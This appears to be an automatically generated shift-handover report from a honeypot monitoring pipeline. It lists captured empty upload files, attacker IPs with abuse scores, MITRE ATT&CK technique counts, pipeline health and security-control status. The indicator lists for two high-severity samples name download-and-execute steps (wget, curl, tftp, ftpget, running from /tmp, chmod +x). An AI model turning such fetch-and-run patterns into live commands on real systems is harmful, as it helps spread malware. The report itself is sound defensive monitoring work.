| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.124.148[.]185` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 21 |
| `69.124.69[.]20` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 1 |
| `122.160.187[.]31` | IN | ABTS DELHI, | **100** ⚠️ | 50 |
| `191.34.222[.]174` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 6 |
| `164.92.115[.]22` | US | DigitalOcean, LLC | **100** ⚠️ | 9 |
| `65.20.204[.]41` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `35.130.111[.]98` | US | Charter Communications LLC | **100** ⚠️ | 50 |
| `220.179.87[.]204` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 6 |
| `176.10.197[.]168` | SE | Bahnhof AB | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 213 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 179 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 32 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 32 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 32 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 10 |
| AbuseIPDB score 1 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 343 cases |
| Tool 34  | Credential Extractor        | ✅ 223 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 137 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (6.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 88 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 179 priority case(s) shown individually · 47 recon entry/entries in table (12 group(s) consolidating 106 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-24T12:58:23Z_
